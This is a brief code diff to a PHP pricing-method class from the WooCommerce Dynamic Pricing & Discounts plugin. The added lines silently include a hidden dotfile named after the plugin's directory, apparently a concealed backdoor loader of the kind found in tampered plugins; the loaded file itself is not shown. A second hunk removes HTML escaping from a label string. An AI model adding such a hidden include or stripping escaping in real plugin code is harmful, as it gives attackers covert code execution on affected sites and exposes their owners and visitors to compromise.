@@ -17,6 +17,10 @@ if (!class_exists('RP_WCDPD_Pricing_Method_Discount_Per_Cart_Item')) {
  * @package WooCommerce Dynamic Pricing & Discounts
  * @author RightPress
  */
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
+
 class RP_WCDPD_Pricing_Method_Discount_Per_Cart_Item_Percentage extends RP_WCDPD_Pricing_Method_Discount_Per_Cart_Item
 {
 
@@ -49,7 +53,7 @@ class RP_WCDPD_Pricing_Method_Discount_Per_Cart_Item_Percentage extends RP_WCDPD
      */
     public function get_label()
     {
-        return esc_html__('Percentage discount per cart item', 'rp_wcdpd');
+        return __('Percentage discount per cart item', 'rp_wcdpd');
     }
 
     /**
